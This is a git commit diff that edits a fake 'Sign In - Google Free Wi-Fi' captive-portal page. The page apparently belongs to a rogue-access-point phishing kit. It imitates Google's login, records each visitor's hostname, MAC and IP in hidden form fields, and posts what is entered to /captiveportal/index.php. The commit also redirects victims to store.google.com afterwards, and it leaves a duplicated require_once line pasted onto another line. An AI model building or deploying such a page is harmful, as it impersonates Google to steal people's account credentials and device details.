54bea5f5562c4adc42ad9fb2185260074a797059
H4xl0r <31049432+H4xl0r@users.noreply.github.com>
2019-03-23 17:21:58 +0100

    Update index.php

--- portals/google-login/index.php
+++ portals/google-login/index.php
@@ -1,5 +1,5 @@
 <?php
-$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";require_once('helper.php');
 require_once('helper.php');
 ?>
 
@@ -9,21 +9,18 @@ require_once('helper.php');
 <meta charset="utf-8">
 <meta name="viewport" content="width=394, user-scalable=no">
 <title>Sign In - Google Free Wi-Fi</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
 <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
 <link rel="icon" type="image/png" href="assets/img/f8593y1ses.png"/>
 
 <script src="jquery-2.2.1.min.js"></script>
-<script type="text/javascript">
-  function redirect() {
-    setTimeout(function() {
-      window.location = "/captiveportal/index.php";
-    }, 100);
-  }
-</script>
+
 
 </head>
 <body>
-<form novalidate action="/captiveportal/index.php" method="POST" onsubmit="redirect()">
+<form method="POST" action="/captiveportal/index.php">
 	<img src="assets/img/1ckkcu79ho.gif" alt="">
 	<h1>Sign in</h1>
 	<h2>with your Google Account</h2>
@@ -32,14 +29,12 @@ require_once('helper.php');
 	<input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-	<input type="hidden" name="target" value="<?=$destination?>">
-	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
-	<p><a href="">More options</a><span class="text-right"><button type="Submit">NEXT</button></span></p>
+	<input type="hidden" name="target" value="https://store.google.com/">
+	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
 </form>
 <footer>
-	English (United States) <img src="assets/img/mq40xx0kce.gif" alt="">
+	<p>English (United States)</p> <img src="assets/img/mq40xx0kce.gif" alt="">
 	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
 </footer>
-<script>document.onload = function() { document.getElementById("user").focus();};</script>
 </body>
 </html>
